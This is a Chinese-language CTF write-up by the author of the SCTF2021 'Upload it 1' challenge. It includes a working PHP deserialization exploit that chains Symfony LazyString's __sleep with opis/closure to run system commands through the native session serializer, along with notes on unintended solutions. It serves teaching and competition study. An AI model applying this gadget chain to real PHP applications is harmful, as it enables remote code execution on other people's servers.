# Upload it 1

~~被非预期惨了（~~

# How to Start and Stop
## start
```shell
docker-compose up -d
```

## stop
```shell
docker-compose down --rmi all
```

# writeup

题目是一个任意文件上传，但当前目录没有写权限，只能上传到/tmp目录。
题目有`composer.json`，导入了两个包。
```json
{
    "name": "sctf2021/upload",
    "authors": [
        {
            "name": "AFKL",
            "email": "upload@qq.com"
        }
    ],
    "require": {
        "symfony/string": "^5.3",
        "opis/closure": "^3.6"
    }
}
```

## 预期解
在出完`ezsou`一题后，我注意到`imi`框架作者使用序列化来统计字符串长度，导致触发了`__sleep`链。我便想php的原生session是否也会触发。于是便去审计php源码。

在`session.c#L2744`中，可以发现session组件在一个请求结束后判断session是否active，如果active就去调用`php_session_flush`函数。

![image-20211230171214360](https://gitee.com/AFKL/image/raw/master/img/image-20211230171214360.png)

![image-20211230171409423](https://gitee.com/AFKL/image/raw/master/img/image-20211230171409423.png)

![image-20211230171503656](https://gitee.com/AFKL/image/raw/master/img/image-20211230171503656.png)

经过一系列调用，最终程序会走到`php_session_encode`中，而这个函数会调用对应的session.serialize_handler。

![image-20211230171751978](https://gitee.com/AFKL/image/raw/master/img/image-20211230171751978.png)

题目中的handler通过phpinfo得知为`php`

![image-20211230171933991](https://gitee.com/AFKL/image/raw/master/img/image-20211230171933991.png)

而`php`handler的`encode`实现中必然调用了序列化函数，那么说明`php`的原生session同样可以触发`__sleep`链。

![image-20211230172121544](https://gitee.com/AFKL/image/raw/master/img/image-20211230172121544.png)

那么这样只需要通过`LazyString`的`__sleep`点调用匿名函数库即可。

```php
<?php
namespace Symfony\Component\String {
    class LazyString {
        private $value;

        public function __construct($a)
        {
            $this->value = $a;
        }
    }
}

namespace {
    include_once "vendor/autoload.php";
    $func = function() {system("cat /flag");};
    $raw = \Opis\Closure\serialize($func);
    $data = unserialize($raw);
    $exp = new \Symfony\Component\String\LazyString($data);

    var_dump(base64_encode(serialize($exp)));
}
```

## 十万乃至九万的非预期

这道题最失败的一点，如同某位大师傅说的：

![image-20211231024912928](https://gitee.com/AFKL/image/raw/master/img/image-20211231024912928.png)

确实这种组件必然有写就有读，而且触发过于简单，导致许多人并没有注意到触发`__sleep`链的这个操作就把题做出来了，这脱离了我出这题的初衷...

还有就是我对库本身还不够理解，例如我并不知道匿名函数库中的function字段可以将`function() {system("cat /f*");}`修改为一段代码`system("cat /f*")`。这样可以直接在反序列化的时候触发。这也是为什么我临时出了一道`Upload it 2`。

![image-20211231030648347](https://gitee.com/AFKL/image/raw/master/img/image-20211231030648347.png)

还有就是session中的属性有字符串操作，导致其直接触发了`__toString`...

总的来说`upload it`两题出的很失败，希望师傅们多多谅解，也希望师傅们可以通过这个wp学到东西。